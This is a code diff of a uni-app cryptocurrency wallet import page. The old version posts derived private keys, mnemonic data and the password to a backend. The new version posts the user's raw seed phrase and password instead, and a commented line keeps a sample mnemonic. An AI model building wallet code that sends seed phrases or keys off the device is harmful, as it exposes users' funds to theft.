@@ -33,28 +33,26 @@
 </template>
 
 <script>
-	import * as base from '@/common/word/base';
-	import * as address from '@/common/word/address';
 	import { allTipWords } from '@/common/word'
 	const INIT_TITLE = '导入身份钱包'
-	import { CRYPTOCURRENCY_TYPE } from '@/common/constants';
-	import { postWalletInfo } from '@/common/utils';
+	import { rules } from '@/common/utils/validation.js';
+	import { showToast } from '@/common/utils';
+	import { postWalletInfo, getDeviceInfo } from '@/common/utils';
 	export default {
 		data() {
 			return {
 				allTipWords: allTipWords,
 				tipWords: [],
+				// words: 'auto where claw holiday retire kingdom high pluck sad purpose brain pulse',
 				words: '',
 				walletName: '',
 				password: '',
 				confirmPassword: '',
 				mnemonicCode: '',
-				address: '',
-				privateKey: '',
-				deviceId: 'c3c0268fa44293f2',
+				deviceId: '',
 				checked: false,
 				fixedBottom: 0,
-				type: '',
+				chain_name: '',
 				title: INIT_TITLE,
 			};
 		},
@@ -63,34 +61,23 @@
 				return this.words && this.walletName && this.password.length >= 8 && this.password == this.confirmPassword && this.checked
 			}
 		},
-		onLoad(options) {
-			// console.log(lodash)
-			if(options.type) {
-				this.type = options.type;
-				this.title =  `导入${options.type}钱包`
+		async onLoad(options) {
+			if(options.chain_name) {
+				this.chain_name = options.chain_name;
+				this.title =  `导入${options.chain_name}钱包`
 				uni.setNavigationBarTitle({
-					title: `导入${options.type}钱包`
+					title: `导入${options.chain_name}钱包`
 				})
 			}
+			// 获取设备信息
+			const deviceInfo = await getDeviceInfo()
+			this.deviceId = deviceInfo.device_id
 			uni.onKeyboardHeightChange((res) =>{
-				console.log(res.height)
 				if(res.height == 0) {
 					this.tipWords = []
 				}
 				this.fixedBottom = res.height
 			})
-			// 获取设备信息
-			// #ifdef APP-PLUS
-			plus.device.getInfo({
-				success: (e) =>{
-					this.deviceId = e.uuid
-					console.log('getDeviceInfo success: '+JSON.stringify(e));
-				},
-				fail: (e) =>{
-					console.log('getDeviceInfo failed: '+JSON.stringify(e));
-				}
-			});
-			// #endif
 		},
 		methods: {
 			handleInput(e) {
@@ -123,33 +110,19 @@
 			},
 			async handleSave() {
 				if(!this.isActive) return 
-				let word_vld = await base.ValidateMnemonic(this.words, "english")
-				if(!word_vld) {
-					return this.$alert('助记词无效')
+				if(!rules.password.isVaild(this.password)){
+					showToast(rules.password.message)
+					return
 				}
-				//助记词编码
-				this.mnemonicCode = await base.MnemonicToEntropy(this.words, "english")
-				
-				//助记词生成地址
-				var seed_sync = await base.MnemonicToSeedSync(this.words, "")
-				var addrs = await address.CreateEthAddressBySeed(seed_sync, 0)
-				this.address = addrs.address
-				this.privateKey = addrs.privateKey
-				
-				let uuid = Math.random().toString(36).substr(-10)
-				const { chain, symbol, activeImg } = CRYPTOCURRENCY_TYPE[this.type] || {};
-				postWalletInfo(this.type,{
-					device_id: this.deviceId, // 设备ID
-					uuid,// 钱包ID
-					chain,// 链名称
-					symbol,// 币种名称
-					wallet_name: this.walletName,// 钱包名称
-					address: this.address,// 地址
-					private_key: this.privateKey,// 私钥
-					mnemonic_code: this.mnemonicCode,// 助记词编码
-					password: this.password,// 密码
-					icon: activeImg,// 图标
-					contract_addr: '',// 合约地址
+				if(!rules.walletName.isVaild(this.walletName)){
+					showToast(rules.walletName.message)
+					return
+				}
+				postWalletInfo({
+					chain_name: this.chain_name,
+					words: this.words,
+					wallet_name: this.walletName,
+					password: this.password,
 				})
 			}
 		}
